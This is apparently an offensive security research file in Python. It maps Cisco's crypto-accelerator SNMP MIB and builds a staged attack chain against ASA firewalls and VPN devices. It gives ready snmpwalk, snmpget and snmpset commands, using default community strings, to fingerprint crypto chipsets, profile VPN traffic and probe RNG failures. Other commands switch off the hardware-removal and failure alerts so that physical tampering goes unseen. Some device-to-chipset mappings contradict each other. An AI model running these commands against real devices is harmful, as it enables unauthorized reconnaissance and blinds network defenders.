"""
cisco_snmp_crypto_accelerator_re.py — Cisco Crypto Accelerator SNMP MIB RE

Source MIB: CISCO-CRYPTO-ACCELERATOR-MIB (ciscoMgmt.467, 2005/2016)
Source file: CISCO-CRYPTO-ACCELERATOR-MIB.my

Hardware covered:
  sep/sepe          — VPN3000 series concentrators
  aimVpn series     — 2600/2700/2800/3700 series routers
  isa               — 7200 series
  vam/vam2/vam2plus — 7200/7300 series
  vpnsm             — Catalyst 6500 VPN Service Module
  caviumNitrox      — ASA 5500/5500-X (Cavium CN1xxx)
  caviumNitroxII    — newer ASA variants
  caviumNitroxLite  — low-end ASA variants

Primary attack context: ASA targets (caviumNitrox* family).
"""

# ─────────────────────────────────────────────────────────
# MIB identity
# ─────────────────────────────────────────────────────────
MIB_IDENTITY = {
    "name":          "CISCO-CRYPTO-ACCELERATOR-MIB",
    "oid_base":      "1.3.6.1.4.1.9.9.467",
    "ciscoMgmt":     "467",
    "last_updated":  "2005-03-08",
    "copyright":     "2005, 2016 Cisco Systems",
    "author":        "S Ramakrishnan, Jan 2005",
}

# ─────────────────────────────────────────────────────────
# OID tree (fully resolved)
# ─────────────────────────────────────────────────────────
OID_TREE = {
    "root":            "1.3.6.1.4.1.9.9.467",
    "notifs":          "1.3.6.1.4.1.9.9.467.0",
    "objects":         "1.3.6.1.4.1.9.9.467.1",
    "conform":         "1.3.6.1.4.1.9.9.467.2",

    "capability": {
        "subtree":                "1.3.6.1.4.1.9.9.467.1.1",
        "ccaSupportsHwCrypto":    "1.3.6.1.4.1.9.9.467.1.1.1.0",   # TruthValue, RO
        "ccaSupportsModularHw":   "1.3.6.1.4.1.9.9.467.1.1.2.0",   # TruthValue, RO
        "ccaMaxAccelerators":     "1.3.6.1.4.1.9.9.467.1.1.3.0",   # -1..50, RO
        "ccaMaxCryptoThroughput": "1.3.6.1.4.1.9.9.467.1.1.4.0",   # Mbps, RO
        "ccaMaxCryptoConnections":"1.3.6.1.4.1.9.9.467.1.1.5.0",   # VPN flows, RO
    },

    "global_stats": {
        "subtree":                        "1.3.6.1.4.1.9.9.467.1.2.1",
        "ccaGlobalNumActiveAccelerators": "1.3.6.1.4.1.9.9.467.1.2.1.1.0",
        "ccaGlobalNumNonOperAccelerators":"1.3.6.1.4.1.9.9.467.1.2.1.2.0",
        "ccaGlobalInOctets":              "1.3.6.1.4.1.9.9.467.1.2.1.3.0",
        "ccaGlobalOutOctets":             "1.3.6.1.4.1.9.9.467.1.2.1.4.0",
        "ccaGlobalInPkts":                "1.3.6.1.4.1.9.9.467.1.2.1.5.0",
        "ccaGlobalOutPkts":               "1.3.6.1.4.1.9.9.467.1.2.1.6.0",
        "ccaGlobalOutErrPkts":            "1.3.6.1.4.1.9.9.467.1.2.1.7.0",
    },

    "accelerator_table": {
        "subtree":                     "1.3.6.1.4.1.9.9.467.1.2.2.1",
        "note": "Index = ccaAcclIndex (1..50); append .<index> to OIDs",
        "ccaAcclEntPhysicalIndex":     "1.3.6.1.4.1.9.9.467.1.2.2.1.2.<idx>",
        "ccaAcclStatus":               "1.3.6.1.4.1.9.9.467.1.2.2.1.3.<idx>",
        "ccaAcclType":                 "1.3.6.1.4.1.9.9.467.1.2.2.1.4.<idx>",   # CAModuleType enum
        "ccaAcclVersion":              "1.3.6.1.4.1.9.9.467.1.2.2.1.5.<idx>",   # firmware version string
        "ccaAcclSlot":                 "1.3.6.1.4.1.9.9.467.1.2.2.1.6.<idx>",
        "ccaAcclActiveTime":           "1.3.6.1.4.1.9.9.467.1.2.2.1.7.<idx>",
        "ccaAcclRandRequests":         "1.3.6.1.4.1.9.9.467.1.2.2.1.23.<idx>",  # HRNG requests
        "ccaAcclRandReqFails":         "1.3.6.1.4.1.9.9.467.1.2.2.1.24.<idx>",  # HRNG failures
        "ccaAcclDHKeysGenerated":      "1.3.6.1.4.1.9.9.467.1.2.2.1.25.<idx>",
        "ccaAcclDHDerivedSecretKeys":  "1.3.6.1.4.1.9.9.467.1.2.2.1.26.<idx>",
        "ccaAcclRSAKeysGenerated":     "1.3.6.1.4.1.9.9.467.1.2.2.1.27.<idx>",
        "ccaAcclRSASignings":          "1.3.6.1.4.1.9.9.467.1.2.2.1.28.<idx>",
        "ccaAcclRSAVerifications":     "1.3.6.1.4.1.9.9.467.1.2.2.1.29.<idx>",
        "ccaAcclDSAKeysGenerated":     "1.3.6.1.4.1.9.9.467.1.2.2.1.34.<idx>",
        "ccaAcclDSASignings":          "1.3.6.1.4.1.9.9.467.1.2.2.1.35.<idx>",
        "ccaAcclDSAVerifications":     "1.3.6.1.4.1.9.9.467.1.2.2.1.36.<idx>",
        "ccaAcclOutboundSSLRecords":   "1.3.6.1.4.1.9.9.467.1.2.2.1.37.<idx>",
        "ccaAcclInboundSSLRecords":    "1.3.6.1.4.1.9.9.467.1.2.2.1.38.<idx>",
    },

    "protocol_stats_table": {
        "subtree": "1.3.6.1.4.1.9.9.467.1.2.3.1",
        "note": "Index = ccaProtId (protocol enum); append .<proto_id>",
        "protocol_ids": {
            "other(1)": 1, "ikev1(2)": 2, "ikev2(3)": 3,
            "ipsec(4)": 4, "ssl(5)": 5, "ssh(6)": 6, "srtp(7)": 7,
        },
        "ccaProtPktEncryptsReqs":       "1.3.6.1.4.1.9.9.467.1.2.3.1.2.<proto>",
        "ccaProtPktDecryptsReqs":       "1.3.6.1.4.1.9.9.467.1.2.3.1.3.<proto>",
        "ccaProtHmacCalcReqs":          "1.3.6.1.4.1.9.9.467.1.2.3.1.4.<proto>",
        "ccaProtSaCreateReqs":          "1.3.6.1.4.1.9.9.467.1.2.3.1.5.<proto>",
        "ccaProtSaRekeyReqs":           "1.3.6.1.4.1.9.9.467.1.2.3.1.6.<proto>",
        "ccaProtSaDeleteReqs":          "1.3.6.1.4.1.9.9.467.1.2.3.1.7.<proto>",
        "ccaProtNextPhaseKeyAllocReqs": "1.3.6.1.4.1.9.9.467.1.2.3.1.10.<proto>",
        "ccaProtRndGenReqs":            "1.3.6.1.4.1.9.9.467.1.2.3.1.11.<proto>",
        "ccaProtFailedReqs":            "1.3.6.1.4.1.9.9.467.1.2.3.1.12.<proto>",
    },

    # READ-WRITE — notification suppression attack surface
    "notif_control": {
        "subtree":                    "1.3.6.1.4.1.9.9.467.1.3",
        "ccaNotifCntlAcclInserted":   "1.3.6.1.4.1.9.9.467.1.3.1.0",  # RW, default unspecified
        "ccaNotifCntlAcclRemoved":    "1.3.6.1.4.1.9.9.467.1.3.2.0",  # RW, default unspecified
        "ccaNotifCntlAcclOperational":"1.3.6.1.4.1.9.9.467.1.3.3.0",  # RW, default unspecified
        "ccaNotifCntlAcclDisabled":   "1.3.6.1.4.1.9.9.467.1.3.4.0",  # RW, DEFVAL false(2)
    },
}

# ─────────────────────────────────────────────────────────
# Hardware module type enum (CAModuleType)
# ─────────────────────────────────────────────────────────
CA_MODULE_TYPES = {
    1:  "other",
    2:  "software",         # software-only encryption path
    3:  "integrated",       # non-modular, integrated into device
    4:  "sep",              # VPN3000 series concentrator
    5:  "sepe",             # VPN3000 series concentrator (enhanced)
    6:  "a1700VpnModule",   # 1700 series routers
    7:  "aimVpnIBp",        # 2600/3700 series
    8:  "aimVpnIEp",        # 2600/3700 series
    9:  "aimVpnIIBp",       # 2600/2700/2800 series
    10: "aimVpnIIEp",       # 2600/2700/2800 series
    11: "aimVpnIIHp",       # 2600/2700/2800 series
    12: "isa",              # 7200 series
    13: "vam",              # 7200/7300 series
    14: "vam2",             # 7200/7300 series
    15: "vam2plus",         # 7200/7300 series
    16: "vpnsm",            # Catalyst 6500 VPN Service Module
    17: "caviumNitrox",     # ASA 5500/5500-X — Cavium CN1xxx silicon
    18: "caviumNitroxII",   # newer ASA variants — Cavium CN2xxx
    19: "caviumNitroxLite", # low-end ASA (ASA 5505, 5510) — Cavium NitroxLite
}

# caviumNitrox maps to ASA product lines:
# caviumNitrox(17):     ASA 5510/5520/5540/5550, ASA 5580-20/40
# caviumNitroxII(18):   ASA 5505, 5512-X through 5555-X
# caviumNitroxLite(19): ASA 5505 (embedded crypto, no dedicated module slot)

# ─────────────────────────────────────────────────────────
# F-SNMP-CA-01: Hardware chipset identification (caviumNitrox)
# ─────────────────────────────────────────────────────────
F_SNMP_CA_01 = {
    "id":       "F-SNMP-CA-01",
    "product":  "Cisco ASA / VPN concentrators (all platforms in CAModuleType TC)",
    "severity": "INFO — enables targeted CVE and side-channel selection",
    "class":    "Hardware Fingerprinting via SNMP",

    "oid":      "1.3.6.1.4.1.9.9.467.1.2.2.1.4.1",   # ccaAcclType for index 1

    "description": (
        "ccaAcclType returns the exact hardware crypto chipset installed. "
        "On ASA targets, values 17/18/19 identify Cavium Nitrox silicon variants. "
        "The Cavium Nitrox CN series has published timing and power side-channel "
        "vulnerabilities — chipset identification is a prerequisite for hardware-targeted attacks. "
        "ccaAcclVersion additionally exposes the hardware accelerator firmware version string."
    ),

    "attack_chain": (
        "SNMP walk ccaAcclType + ccaAcclVersion -> identify Cavium Nitrox variant -> "
        "map to Cavium CN part number -> select applicable side-channel/firmware CVE -> "
        "correlate with ccaAcclRandReqFails for entropy weakness confirmation."
    ),

    "snmp_commands": [
        # Walk full capability subtree (no auth needed on many devices with default 'public')
        "snmpwalk -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.1",
        # Get chipset type for accelerator index 1
        "snmpget -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.2.2.1.4.1",
        # Get hardware firmware version
        "snmpget -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.2.2.1.5.1",
        # Full accelerator table
        "snmpwalk -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.2.2",
    ],

    "decode_type_value": "Integer value -> CA_MODULE_TYPES dict above",
}

# ─────────────────────────────────────────────────────────
# F-SNMP-CA-02: Notification suppression (read-write controls)
# ─────────────────────────────────────────────────────────
F_SNMP_CA_02 = {
    "id":       "F-SNMP-CA-02",
    "product":  "Any Cisco device implementing CISCO-CRYPTO-ACCELERATOR-MIB",
    "severity": "MEDIUM — stealth physical hardware manipulation",
    "class":    "SNMP Write / Event Suppression",

    "description": (
        "ccaNotifCntl* objects are read-write (ACCESS read-write in MIB). "
        "With SNMPv2c write access (community 'private', often still default), "
        "an attacker can suppress crypto accelerator hardware alerts: "
        "- ccaNotifCntlAcclRemoved = false(2): card removal generates no SNMP trap "
        "- ccaNotifCntlAcclDisabled = false(2): hardware failure generates no trap "
        "This covers physical hardware attacks (VPN service module removal from a "
        "Catalyst 6500 chassis, ASA crypto card removal) and targeted hardware "
        "DoS (inducing accelerator failure). NMS is blind to the event."
    ),

    "prerequisite": "SNMPv2c write community string (default 'private' on many Cisco devices)",

    "snmp_commands": {
        "suppress_removal_trap": (
            "snmpset -v 2c -c private <target> "
            "1.3.6.1.4.1.9.9.467.1.3.2.0 i 2"
            # TruthValue: 1=true, 2=false
        ),
        "suppress_disabled_trap": (
            "snmpset -v 2c -c private <target> "
            "1.3.6.1.4.1.9.9.467.1.3.4.0 i 2"
        ),
        "suppress_all": (
            "for oid in .1.0 .2.0 .3.0 .4.0; do\n"
            "  snmpset -v 2c -c private <target> "
            "  1.3.6.1.4.1.9.9.467.1.3${oid} i 2\n"
            "done"
        ),
        "read_current_state": (
            "snmpwalk -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.3"
        ),
    },

    "note": (
        "DEFVAL for ccaNotifCntlAcclDisabled is false(2). "
        "Other controls have no DEFVAL — agent-dependent default. "
        "SNMPv3 with auth+priv prevents this; SNMPv1/v2c community-string auth does not."
    ),
}

# ─────────────────────────────────────────────────────────
# F-SNMP-CA-03: Crypto operation traffic oracle
# ─────────────────────────────────────────────────────────
F_SNMP_CA_03 = {
    "id":       "F-SNMP-CA-03",
    "product":  "Cisco ASA / VPN concentrators implementing protocol stats table",
    "severity": "LOW-MEDIUM — traffic pattern disclosure",
    "class":    "SNMP Information Disclosure / Traffic Analysis",

    "description": (
        "ccaProtocolStatsTable breaks down crypto accelerator operations by security protocol "
        "(IKEv1, IKEv2, IPsec, SSL, SSH, SRTP). Polling ccaProtSaCreateReqs and ccaProtSaDeleteReqs "
        "at intervals reveals SA creation/teardown rates without packet capture access. "
        "ccaProtNextPhaseKeyAllocReqs exposes IKE Quick Mode frequency. "
        "Combined with ccaGlobalInPkts/ccaGlobalOutPkts, gives throughput profile."
    ),

    "snmp_commands": {
        "ipsec_sa_creates": "snmpget -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.2.3.1.5.4",
        "ikev1_sa_creates": "snmpget -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.2.3.1.5.2",
        "ikev2_sa_creates": "snmpget -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.2.3.1.5.3",
        "ssl_encap_reqs":   "snmpget -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.2.3.1.8.5",
        "full_proto_table": "snmpwalk -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.2.3",
        "delta_poll_loop": (
            "# Poll at 10s intervals, compute delta to reveal VPN session churn rate\n"
            "while true; do\n"
            "  snmpget -v 2c -c public <target> "
            "  1.3.6.1.4.1.9.9.467.1.2.3.1.5.4 | tee -a ipsec_sa_log.txt\n"
            "  sleep 10\n"
            "done"
        ),
    },
}

# ─────────────────────────────────────────────────────────
# F-SNMP-CA-04: HRNG failure — entropy exhaustion indicator
# ─────────────────────────────────────────────────────────
F_SNMP_CA_04 = {
    "id":       "F-SNMP-CA-04",
    "product":  "Cisco ASA / routers with hardware crypto accelerator",
    "severity": "MEDIUM — key material quality indicator",
    "class":    "Entropy / RNG State Disclosure",

    "description": (
        "ccaAcclRandReqFails counts HRNG requests that could not be fulfilled. "
        "A non-zero counter indicates the hardware RNG is exhausted or failing. "
        "Keys generated during HRNG failure fall back to software PRNG or fail entirely. "
        "Combined with ccaAcclRSAKeysGenerated counter, a non-zero RandReqFails during "
        "a period of RSA key generation implies weaker key material from that window. "
        "ccaAcclRandRequests baseline establishes the ratio of failures to total requests."
    ),

    "snmp_commands": {
        "hrng_fails":         "snmpget -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.2.2.1.24.1",
        "hrng_total_reqs":    "snmpget -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.2.2.1.23.1",
        "rsa_keys_generated": "snmpget -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.2.2.1.27.1",
        "dh_keys_generated":  "snmpget -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.2.2.1.25.1",
    },

    "interpretation": {
        "ccaAcclRandReqFails > 0": "HRNG has failed at least once — check key material integrity",
        "fails_ratio > 5%": "significant entropy issues; keys from this period are suspect",
        "fails during RSA gen": "RSA keypair may have been generated with degraded entropy",
    },
}

# ─────────────────────────────────────────────────────────
# Composite SNMP walk — full tree enumeration
# ─────────────────────────────────────────────────────────
FULL_WALK_COMMANDS = {
    "snmpv2c_walk_all": (
        "snmpwalk -v 2c -c public <target> 1.3.6.1.4.1.9.9.467"
    ),
    "snmpv2c_capability_only": (
        "snmpwalk -v 2c -c public <target> 1.3.6.1.4.1.9.9.467.1.1"
    ),
    "snmpv3_walk": (
        "snmpwalk -v 3 -u <user> -l authPriv -a SHA -A <authpw> -x AES -X <privpw> "
        "<target> 1.3.6.1.4.1.9.9.467"
    ),
    # OID-only output for bulk import
    "numeric_oids": (
        "snmpwalk -v 2c -c public -On <target> 1.3.6.1.4.1.9.9.467"
    ),

    "python_snmp": """
import subprocess, re

TARGET = "<target>"
COMMUNITY = "public"
BASE_OID = "1.3.6.1.4.1.9.9.467"

result = subprocess.run(
    ["snmpwalk", "-v", "2c", "-c", COMMUNITY, "-On", TARGET, BASE_OID],
    capture_output=True, text=True
)

for line in result.stdout.splitlines():
    m = re.match(r'^([^ ]+) = (.+)$', line)
    if m:
        oid, value = m.groups()
        print(oid, "->", value)
""",
}

# ─────────────────────────────────────────────────────────
# Attack chain: ASA crypto hardware profiling
# ─────────────────────────────────────────────────────────
ASA_ATTACK_CHAIN = {
    "stage_1_fingerprint": {
        "action": "Walk ccaCapability + ccaAcceleratorTable",
        "yields": [
            "ccaAcclType -> Cavium Nitrox variant (17/18/19)",
            "ccaAcclVersion -> hardware firmware version string",
            "ccaMaxCryptoConnections -> max concurrent VPN sessions (capacity recon)",
            "ccaMaxCryptoThroughput -> throughput ceiling (sizing attack surface)",
        ],
        "commands": [
            "snmpwalk -v 2c -c public <asa_mgmt_ip> 1.3.6.1.4.1.9.9.467.1.1",
            "snmpwalk -v 2c -c public <asa_mgmt_ip> 1.3.6.1.4.1.9.9.467.1.2.2",
        ],
    },
    "stage_2_entropy_check": {
        "action": "Poll ccaAcclRandReqFails and ccaAcclRandRequests",
        "yields": "HRNG health status — non-zero fails = entropy window of opportunity",
        "commands": [
            "snmpget -v 2c -c public <asa_mgmt_ip> 1.3.6.1.4.1.9.9.467.1.2.2.1.24.1",
            "snmpget -v 2c -c public <asa_mgmt_ip> 1.3.6.1.4.1.9.9.467.1.2.2.1.23.1",
        ],
    },
    "stage_3_traffic_profile": {
        "action": "Delta-poll ccaProtSaCreateReqs across all protocol indices",
        "yields": "Live VPN SA churn rate, protocol mix (IKEv1 vs IKEv2), SSL session load",
        "commands": [
            "snmpwalk -v 2c -c public <asa_mgmt_ip> 1.3.6.1.4.1.9.9.467.1.2.3.1.5",
        ],
    },
    "stage_4_suppress_notifs": {
        "action": "SET ccaNotifCntl* to false(2) with 'private' community",
        "prerequisite": "SNMPv2c write community; ASA SNMP server configured with write access",
        "yields": "NMS blind to crypto card removal/failure; physical tamper covert",
        "commands": [
            "snmpset -v 2c -c private <asa_mgmt_ip> 1.3.6.1.4.1.9.9.467.1.3.2.0 i 2",
            "snmpset -v 2c -c private <asa_mgmt_ip> 1.3.6.1.4.1.9.9.467.1.3.4.0 i 2",
        ],
    },
    "note": (
        "ASA management IP is typically the interface IP with 'snmp-server host <iface> <ip> version 2c'. "
        "SNMP on ASA is disabled by default — this chain requires 'snmp-server enable' in config. "
        "If SNMP is enabled, ASA ships with no default community configured — community must be in "
        "snmp-server community <string> config. Many deployments use 'public'/'private'."
    ),
}

# ─────────────────────────────────────────────────────────
# Platform applicability
# ─────────────────────────────────────────────────────────
PLATFORM_APPLICABILITY = {
    "ASA_5500":    {"cavium_type": "caviumNitrox(17)",     "vpnsm": False, "modular_hw": False},
    "ASA_5500-X":  {"cavium_type": "caviumNitroxII(18)",   "vpnsm": False, "modular_hw": False},
    "ASA_5505":    {"cavium_type": "caviumNitroxLite(19)", "vpnsm": False, "modular_hw": False},
    "Cat6500_VPNSM":{"cavium_type": None, "vpnsm": True,  "modular_hw": True,  "type_val": 16},
    "VPN3000":     {"cavium_type": None, "sep_type": "sep(4)/sepe(5)", "modular_hw": True},
    "Router_7200": {"cavium_type": None, "isa_vam": "isa(12)/vam(13-15)", "modular_hw": True},
}
